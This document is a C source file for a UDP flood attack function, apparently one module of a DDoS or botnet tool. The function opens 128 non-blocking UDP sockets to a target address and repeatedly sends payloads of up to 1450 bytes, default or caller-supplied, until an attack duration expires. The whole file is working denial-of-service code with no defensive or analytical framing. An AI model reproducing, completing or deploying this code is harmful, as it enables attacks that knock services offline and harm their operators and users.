#define _GNU_SOURCE

#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>
#include <fcntl.h>

#include "udpcustom_attack.h"
#include "../headers/protocol.h"

#define UDP_CUSTOM_SOCKS 128

void* udpcustom_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    attack_option* opt_psize   = find_option(params, OPT_PSIZE);
    attack_option* opt_payload = find_option(params, OPT_PAYLOAD);

    uint16_t psize = opt_psize ? get_option_u16(opt_psize) : 1450;
    if (psize == 0 || psize > 1450) psize = 1450;

    char *data = malloc(psize);
    if (!data) return NULL;
    memset(data, 0xFF, psize);

    if (opt_payload && opt_payload->data && opt_payload->len > 0) {
        size_t copy_len = opt_payload->len < psize ? opt_payload->len : psize;
        memcpy(data, opt_payload->data, copy_len);
    }

    int sndbuf = 1024 * 1024;
    int fds[UDP_CUSTOM_SOCKS];
    int active = 0;

    for (int i = 0; i < UDP_CUSTOM_SOCKS; i++) {
        fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
        if (fds[i] < 0) { fds[i] = -1; continue; }
        setsockopt(fds[i], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
        fcntl(fds[i], F_SETFL, O_NONBLOCK);
        connect(fds[i], (struct sockaddr*)&params->target_addr, sizeof(params->target_addr));
        active++;
    }

    if (active == 0) { free(data); return NULL; }

    time_t end_time = time(NULL) + params->duration;
    uint64_t iter = 0;

    while (params->active) {
        for (int i = 0; i < UDP_CUSTOM_SOCKS; i++) {
            if (fds[i] == -1) continue;
            send(fds[i], data, psize, MSG_NOSIGNAL);
        }
        if ((++iter & 0xFFF) == 0 && time(NULL) >= end_time) break;
    }

    for (int i = 0; i < UDP_CUSTOM_SOCKS; i++)
        if (fds[i] != -1) close(fds[i]);
    free(data);
    return NULL;
}
